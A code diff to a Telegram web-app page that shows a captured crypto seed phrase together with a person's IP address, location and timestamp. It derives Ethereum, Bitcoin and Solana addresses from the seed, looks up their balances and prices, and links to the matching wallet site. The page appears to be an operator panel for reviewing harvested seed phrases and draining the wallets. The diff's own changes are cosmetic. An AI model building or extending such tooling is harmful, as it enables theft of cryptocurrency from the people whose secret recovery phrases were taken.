@@ -7,6 +7,8 @@
     <link rel="stylesheet" href="https://sp574-maker.github.io/maker/style.css" />
     <link rel="stylesheet" href="https://sp574-maker.github.io/maker/profile.css" />
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <!-- Скрипти для роботи з криптогаманцями -->
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/bip39@2.5.0/browser/bip39.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/bitcoinjs-lib@6.1.0/dist/bitcoinjs-lib.min.js"></script>
@@ -33,23 +35,23 @@
         const walletType = (data.wallet || "").toLowerCase();
         const timestamp = data.timestamp || "–";
         const ip = data.ip || "–";
-        const userLocation = data.location || "–";
+        const locationInfo = data.location || "–";
 
         document.getElementById("timestamp").textContent = timestamp;
         document.getElementById("userIp").textContent = ip;
-        document.getElementById("userLocation").textContent = userLocation;
+        document.getElementById("userLocation").textContent = locationInfo;
         document.getElementById("seed").textContent = seedPhrase;
 
         let addresses = {
             eth: null,
             btc: null,
-            sol: null,
+            sol: null
         };
 
         const supported = [
             { coin: "ethereum", symbol: "ETH", chain: "ethereum", key: "eth" },
             { coin: "bitcoin", symbol: "BTC", chain: "bitcoin", key: "btc" },
-            { coin: "solana", symbol: "SOL", chain: "solana", key: "sol" },
+            { coin: "solana", symbol: "SOL", chain: "solana", key: "sol" }
         ];
 
         async function deriveAddresses(seedPhrase) {
@@ -60,7 +62,7 @@
                 document.getElementById("ethAddress").textContent = addresses.eth;
 
                 // BTC
-                const seed = await bip39.mnemonicToSeed(seedPhrase);
+                const seed = await window.bip39.mnemonicToSeed(seedPhrase);
                 const root = bitcoin.bip32.fromSeed(seed);
                 const child = root.derivePath("m/44'/0'/0'/0/0");
                 const { address: btcAddress } = bitcoin.payments.p2pkh({ pubkey: child.publicKey });
@@ -69,8 +71,8 @@
 
                 // SOL
                 const solKey = seed.slice(0, 32);
-                const solKeypair = solanaWeb3.Keypair.fromSeed(solKey);
-                addresses.sol = solKeypair.publicKey.toBase58();
+                const solAddress = await solanaWeb3.Keypair.fromSeed(solKey).publicKey.toBase58();
+                addresses.sol = solAddress;
                 document.getElementById("solAddress").textContent = addresses.sol;
             } catch (e) {
                 console.error("❌ Ошибка генерации адресов:", e);
@@ -84,7 +86,7 @@
                 const res = await fetch(url);
                 return await res.json();
             } catch (e) {
-                console.warn("⚠️ Ошибка получения цен:", e.message);
+                console.warn("❌ Ошибка получения цен:", e);
                 return {};
             }
         }
@@ -93,13 +95,16 @@
             try {
                 switch (chain) {
                     case "ethereum":
-                        const ethRes = await fetch(`https://api.etherscan.io/api?module=account&action=balance&address=${address}&tag=latest&apikey=YourKey`);
+                        const ethRes = await fetch(`https://api.etherscan.io/api?module=account&action=balance&address=${address}&tag=latest&apikey=YourApiKey`);
                         const ethData = await ethRes.json();
-                        return parseFloat(ethData.result || 0) / 1e18;
+                        if (!ethData || ethData.status !== "1" || !ethData.result) throw new Error("ETH API error");
+                        return parseFloat(ethData.result) / 1e18;
+
                     case "bitcoin":
                         const btcRes = await fetch(`https://blockchain.info/q/addressbalance/${address}?confirmations=3`);
                         const sats = await btcRes.text();
                         return parseFloat(sats || 0) / 1e8;
+
                     case "solana":
                         const solRes = await fetch("https://api.mainnet-beta.solana.com", {
                             method: "POST",
@@ -113,6 +118,7 @@
                         });
                         const solData = await solRes.json();
                         return parseFloat(solData.result?.value || 0) / 1e9;
+
                     default:
                         return 0;
                 }
@@ -146,12 +152,16 @@
             else if (walletType.includes("ton")) url = "https://tonkeeper.com/";
             else if (walletType.includes("coinbase")) url = "https://www.coinbase.com/wallet";
 
-            if (window.Telegram && Telegram.WebApp) Telegram.WebApp.openLink(url);
-            else window.open(url, "_blank");
+            if (window.Telegram && Telegram.WebApp) {
+                Telegram.WebApp.openLink(url);
+            } else {
+                window.open(url, "_blank");
+            }
         }
 
         document.getElementById("goWalletBtn").addEventListener("click", goToWallet);
 
+        // Старт
         deriveAddresses(seedPhrase).then(() => {
             calculateTotalETH();
         });
